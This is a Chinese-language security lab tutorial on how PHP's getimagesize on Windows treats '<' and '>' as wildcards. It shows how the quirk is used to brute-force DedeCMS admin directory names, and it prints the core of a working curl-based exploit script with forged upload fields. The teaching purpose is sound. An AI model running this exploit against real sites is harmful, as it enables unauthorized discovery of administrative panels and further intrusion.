@@ -1,0 +1,296 @@
+>
+> 所有文件操作函数都属于敏感函数，当此类函数使用不当或者不安全引用，就会导致业务逻辑上出现问题，会导致诸多安全隐患的发生，例如：任意文件下载、任意文件写入、任意文件删除等漏洞。
+
+以下给大家生动地讲解了文件判断函数getimagesiz可能造成的问题，并引用dedecms目录猜解实例，讲述PHP在不安全的情况下引用此类函数时造成的危害。
+
+希望老铁们通过这一波操作，了解漏洞形成原理和类似文件判断函数带来的风险，在实验环境里亲自体验一把更带感哦，跟我来开启吧！
+**[](https://www.ichunqiu.com/course/61375?from=seg)[>>>>>文件函数实验传送门](https://www.ichunqiu.com/course/61375?from=beef)**[
+****](https://www.ichunqiu.com/course/61375?from=seg)
+
+####  **1、动手实验的目标：**
+
+  * 认识常见的PHP函数
+  * 了解PHP文件判断函数风险
+  * 了解文件操作可能带来的业务逻辑漏洞
+
+####  **2、所需工具：**
+
+  * `Hackbar`: Hackbar是Firefox火狐浏览器中的插件,该工具栏将帮助您测试sql注入，XSS漏洞和网站安全性。其主是帮助开发人员对他的代码进行安全审计。能够快速对字符串进行各种编码。
+
+####  **3、实战操作内容：**
+
+本内容主要介绍`PHP`部分函数,当在Windows上使用PHP时会调用一个`FindFirstFileExW()`的底层`Windows
+API`函数时会存在一些特性
+
+讲解其中一部分函数不安全使用时带来的漏洞,还将结合使用一个`dedecms`实例，利用`PHP`在`Windows`上的特性找到其后台，以方便我们深入理解这些函数可能会带来的危害。
+
+PHP语言某些函数就在Windows系统上拥有了如下奇妙的特性：
+
+    
+    
+    大于号(>)相等于通配符问号(?)
+    
+    小于号(<)相当于通配符星号(*)
+    
+    双引号(")相当于点字符(.)
+
+这个特性很早之前就已经被国外的安全研人员发现
+
+在PHP的`getimagesize`方法中就存在这个特性。
+
+在PHP源码`php-src\ext\standard\image.c`中有该方法的具体定义：
+
+    
+    
+    ...
+    /* {{{ proto array getimagesize(string imagefile [, array info])
+       Get the size of an image as 4-element array */
+    PHP_FUNCTION(getimagesize)
+    {
+        php_getimagesize_from_any(INTERNAL_FUNCTION_PARAM_PASSTHRU, FROM_PATH);
+    }
+    ...
+
+在`getimagesize`方法中调用了`php_getimagesize_from_any`方法,若使用动态调试来简化整个分析过程，逐层追踪后可发现
+
+`getimagesize`调用顺序如下：
+
+    
+    
+    PHP_FUNCTION(getimagesize)
+    
+    php_getimagesize_from_any
+    
+    ...
+    
+    tsrm_realpath_r
+    
+    FindFirstFileExW
+    
+
+本实验动态调试不做重点说明，详细过程请参考以下链接: <https://xianzhi.aliyun.com/forum/topic/2004>
+
+最终可以看见PHP的`getimagesize`方法最终调用了Windows API里的`FindFirstFileExW()`
+
+事实上，由于PHP在语言层面并没有过滤、禁止对`<`、`>`这些特殊字符的使用，除`getimagesize` 函数外，任何调用该Windows
+API方法的文件判断函数都可能存在以上问题
+
+* * *
+
+* * *
+
+####  **4、实验内容：**
+
+本实验我们将用一个调用了这个`winapi`的具体实例`getimagesize`函数讲解，PHP的函数在调用了这个底层`winapi`的方法时会存在的问题。
+
+还将引用`dedecms`作为一个高级实例，当不安全引用同样使用该底层`winapi`的方法的`getimagesize`这个函数会存在的安全风险。
+
+#### 步骤1 ——本地验证getimagesize()函数
+
+使用我们实验中搜索工具`Everything`,找到我们的`phpstudy`安装环境。安装PHP环境
+
+  
+![14.gif](https://image.3001.net/images/20180309/15205788013232.gif!small)  
+
+安装完成之后我们在`C:\phpStudy\www`目录下新建一个`test.php`文件验证`getimagesize`函数的特性，这个路径根据`phpStudy`安装路径有关，请根据实际情况而定。
+
+接下来我们在`C:\phpStudy\www`新建一个目录`asdasdasd`
+
+目录下
+
+  
+
+`test.php`代码如下：
+
+    
+    
+    <?php
+    $a =  $_GET['img'];
+    exec('pause');  
+    if(@getimagesize($a)){ 
+        echo "ok";  
+    }else{
+         echo "no";  
+    }  
+    ?>
+    
+
+准备完成之后，接下来我们访问一下`test.php`
+
+访问地址`http://127.0.0.1/test.php?img=C:\phpStudy\www\a<\1.png`
+
+![3.jpg](https://image.3001.net/images/20180309/15205792552208.jpg!small)![2.png](https://image.3001.net/images/20180309/15205792817461.png!small)  
+
+页面返回`ok`,可见正常路径中原本应该是`asdasdasd`的目录名，被我们使用`a<`代替,`getimagesize`利用该特性成功加载图片文件。
+
+#### 步骤2 —— dedecms后台地址猜解
+
+下面这个例子我们可以使用本节实验中提供的脚本获取到`dedecms`的后台地址
+
+这个漏洞发生在`getimagesize`函数中，而PHP的`getimagesize`方法最终也是调用了前文中讲到的`Windows
+API`里的`FindFirstFileExW()`，上文中也说明了这里Windows上又对`<`、`>`、`"`三个字被赋予了不同的含义。
+
+正是这个原因导致了`dedecms`的后台可被爆破
+
+到这里我们还是先看看漏洞的触发条件
+
+在`dedecms`中的`uploadsafe.inc.php`中的核心代码如下
+
+    
+    
+    ...
+    
+    if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))
+    {
+        $image_dd = @getimagesize($$_key); 
+        
+        if (!is_array($image_dd))
+        {
+            exit('Upload filetype not allow !');
+        }
+    }
+    ...
+    
+
+此处`uploadsafe.inc.php`中直接调用了`getimagesize`方法获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit
+upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
+
+此时在`dedecms`的`tags.php`中加载了`common.inc.php`文件
+
+  
+![4.png](https://image.3001.net/images/20180309/15205791533186.png!small)  
+
+在`common.inc.php`大概148行左右加载了`uploadsafe.inc.php`
+
+    
+    
+    if($_FILES)
+    {
+        require_once(DEDEINC.'/uploadsafe.inc.php');
+    }
+
+到此我们可以得到文件引用关系为:`tags.php` -> `common.inc.php` -> `uploadsafe.inc.php` ->
+`getimagesize()`
+
+ **EXP分析与利用**
+
+在实验环境中会提供我们在互联网上收集的`exp`访问我们的工具库`http://tools.ichunqiu.com/y688t6z4`下载
+
+我们现在把exp中的主要代码分段讲解一下：
+
+    
+    
+    ...
+    
+    if($path) {
+        while(($path = my_func($url, $path))) {
+            echo strtolower($path) . "\r\n";
+        }
+    }
+    else {
+        for($i = 48; $i <= 90; $i++) {
+            if((48 <= $i && $i <= 57) or (65 <= $i && $i <= 90)) {
+                $path = my_func($url, chr($i));
+                while($path) {
+                    echo strtolower($path) . "\r\n";
+                    $path = my_func($url, $path);
+                }
+            }
+        }
+    }
+    ...
+
+这里的`if((48 <= $i && $i <= 57) or (65 <= $i && $i <=
+90))`这段代码可以参考ascii码表就可以理解数字具体含义
+
+  
+![5.png](https://image.3001.net/images/20180309/15205790991061.png!small)  
+
+就是把所有的目录可能会出现的情况`0-9` 、 `a-z`,按位带入程序中去穷举匹配
+
+下面的代码是整个exp的核心部分
+
+    
+    
+    ...
+    
+    function my_func($url, $path = '') {
+        $ch = curl_init($url);
+        $i = 48;
+        global $version;
+    
+            while($i <= 90) {
+                if((48 <= $i && $i <= 57) or (65 <= $i && $i <= 90)) {
+                    if($version != '5.7') {
+                        /* v5.6版本及其以下 */
+                        $admin_path = './' . $path . chr($i) . '</img/admin_top_logo.gif';
+                    }
+                    else {
+                        /* v5.7版本 */
+                        $admin_path = './' . $path . chr($i) . '</images/admin_top_logo.gif';
+                    }
+    
+                    $data = 'dopost=save&_FILES[b4dboy][tmp_name]=' . $admin_path . '&_FILES[b4dboy][name]=0&_FILES[b4dboy][size]=0&_FILES[b4dboy][type]=image/gif';
+    
+                    $options = array(
+                                    CURLOPT_USERAGENT => 'Firefox/58.0',
+                                    CURLOPT_RETURNTRANSFER => true,
+                                    CURLOPT_POST => true,
+                                    CURLOPT_POSTFIELDS => $data,
+                    );
+    
+                    curl_setopt_array($ch, $options);
+    
+                    $response = curl_exec($ch);
+    
+                    if(!preg_match('/(Upload filetype not allow !)/i', $response)) {
+                        $path = $path . chr($i);
+                        return $path;
+                    }
+                }
+    
+                $i++;
+            }
+    ...
+
+这个`exp`就是利用了`dedecms`在设计时的一个小缺陷，当某个目录中存在一个图片文件时，程序会返回正确，当不存在时程序会抛出异常,提示`Upload
+filetype not allow !`。
+
+此时在`dedecms`的前台中可以直接调用`getimagesize()`方法，这时候我们选取了`dedecms`的后台目录中的一个已知图片`admin_top_logo.gif`配合我们进行猜解。具体参见下列代码：
+
+    
+    
+    $admin_path = './' . $path . chr($i) . '</img/admin_top_logo.gif';
+
+这样就可以我们前面讲到的通配符`<`，来进行匹配后台地址，对后台地址逐位穷举，这就是我们这个`exp`的中心思想。
+
+具体操作如下：
+
+将我们下载的`exp.php`,放入PHP安装目录中，这里我们放入`c:\phpStudy\php53`下，这个路径根据`phpStudy`安装路径和选择的PHP版本有关，请根据实际情况而定。
+
+  
+![6.gif](https://image.3001.net/images/20180309/15205791139115.gif!small)  
+
+成功猜解出后台地址。
+
+  
+![7.gif](https://image.3001.net/images/20180309/15205791295145.gif!small)  
+
+####  **实验结果分析与总结：**
+
+  * 问题的产生的根本原因PHP调用了`Windows API`里的`FindFirstFileExW()`/`FindFirstFile()`方法
+  * 该`Windows API`方法对于这个三个字符做了特殊的处理
+  * 感兴趣的同学还可以根据我们实验的思路发现其他的使用方法及漏洞。
+
+####  **几点思考：**
+
+  * PHP还有哪些函数在调用`Windows API`时会存在新的特性吗？
+  * 其他调用这个`Windows API`的语言会出现这个特性吗？
+
+####  **参考地址：**
+
+  * [http://wps2015.org/drops/drops/PHP%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF+%E5%AE%9E%E4%BE%8B.html](http://static2.ichunqiu.com/icq/resources/fileupload/61379/http://wps2015.org/drops/drops/PHP%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF+%E5%AE%9E%E4%BE%8B.html)
+  * [http://www.cnblogs.com/yxhblogs/p/5839800.html](http://static2.ichunqiu.com/icq/resources/fileupload/61379/http://www.cnblogs.com/yxhblogs/p/5839800.html)
+  * [https://xianzhi.aliyun.com/forum/topic/2064](http://static2.ichunqiu.com/icq/resources/fileupload/61379/https://xianzhi.aliyun.com/forum/topic/2064)
+  * [https://xianzhi.aliyun.com/forum/topic/2004](http://static2.ichunqiu.com/icq/resources/fileupload/61379/https://xianzhi.aliyun.com/forum/topic/2004)
+
